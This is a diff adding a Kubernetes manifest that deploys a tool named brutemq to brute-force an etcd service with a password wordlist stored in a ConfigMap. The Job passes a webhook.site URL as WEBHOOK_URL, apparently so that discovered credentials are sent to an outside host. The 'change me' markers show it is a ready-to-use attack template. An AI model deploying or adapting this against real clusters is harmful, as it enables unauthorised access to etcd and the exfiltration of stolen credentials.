@@ -1,0 +1,41 @@
+apiVersion: v1
+kind: Namespace
+metadata:
+  name: brutemq
+---
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: brutemq-passwords
+  namespace: brutemq
+data:
+  passwords.txt: |
+    password1
+    password2
+    password3
+    password4
+---
+apiVersion: batch/v1
+kind: Job
+metadata:
+  name: brutemq-job
+  namespace: brutemq
+spec:
+  template:
+    spec:
+      restartPolicy: Never
+      volumes:
+        - name: passwords-volume
+          configMap:
+            name: brutemq-passwords
+      containers:
+        - name: brutemq
+          image: ghcr.io/codexlynx/brutemq:latest
+          args: ["etcd",  "-d", "passwords.txt"] # change me
+          volumeMounts:
+            - name: passwords-volume
+              mountPath: passwords.txt
+              subPath: passwords.txt
+          env:
+            - name: WEBHOOK_URL
+              value: "https://webhook.site/225ed86a-c742-419d-b0bf-87b95479988e" # change me
